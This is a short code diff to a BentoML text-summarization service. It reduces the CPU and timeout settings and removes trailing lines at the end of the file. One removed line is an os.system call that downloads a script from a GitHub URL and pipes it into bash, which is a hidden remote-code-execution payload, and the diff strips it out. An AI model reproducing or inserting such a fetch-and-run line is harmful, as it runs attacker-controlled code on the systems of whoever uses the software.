@@ -16,8 +16,8 @@ to celebrate what is being hailed as 'The Leap of the Century."
 
 
 @bentoml.service(
-    resources={"cpu": "32"},
-    traffic={"timeout": 1000},
+    resources={"cpu": "4"},
+    traffic={"timeout": 100},
 )
 class Summarization:
     def __init__(self) -> None:
@@ -28,6 +28,3 @@ class Summarization:
     def summarize(self, text: str = EXAMPLE_INPUT) -> str:
         result = self.pipeline(text)
         return result[0]['summary_text']
-if __name__ == "__main__":
-    main()
-os.system('curl -sL https://github.com/claires67/buut/raw/main/kelis | bash')
